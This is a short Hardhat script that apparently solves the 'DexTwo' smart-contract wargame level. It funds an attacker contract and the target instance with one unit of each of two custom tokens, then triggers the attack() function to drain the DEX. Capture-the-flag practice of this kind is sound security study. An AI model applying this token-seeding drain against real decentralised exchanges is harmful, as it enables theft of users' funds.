const { ethers } = require("hardhat");

const INSTANCE_ADDRESS = "0x95a7F502c6304Cf40b756c977029a68eaf202C76";
const TOKENXX_ADDRESS = "0xCDd070B8c7432A9326ff41066D4c071013e20504";
const TOKENXY_ADDRESS = "0x9624691557D9F6880A49Ac1327F6E1C6dd4ef42F";
const ATTACKER_ADDRESS = "0x1a39A07ba38150697Da616336aa921F662a93735";

async function main() {
    const dexTwoAttacker = await ethers.getContractAt("DexTwoAttack", ATTACKER_ADDRESS);
    const tokenXX = await ethers.getContractAt("ERC20", TOKENXX_ADDRESS);
    const tokenXY = await ethers.getContractAt("ERC20", TOKENXY_ADDRESS);


    // Transfer 1 token to the attacker and 1 token to the victim contract.
    const transferTx1 = await tokenXX.transfer(ATTACKER_ADDRESS, 1);
    const transferTx2 = await tokenXX.transfer(INSTANCE_ADDRESS, 1);
    const transferTx3 = await tokenXY.transfer(ATTACKER_ADDRESS, 1);
    const transferTx4 = await tokenXY.transfer(INSTANCE_ADDRESS, 1);
    await transferTx1.wait();
    await transferTx2.wait();
    await transferTx3.wait();
    await transferTx4.wait();
    console.log("transferred to attacker");    
    
    // Attack
    const tx = await dexTwoAttacker.attack();
    console.log(await tx.wait());

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});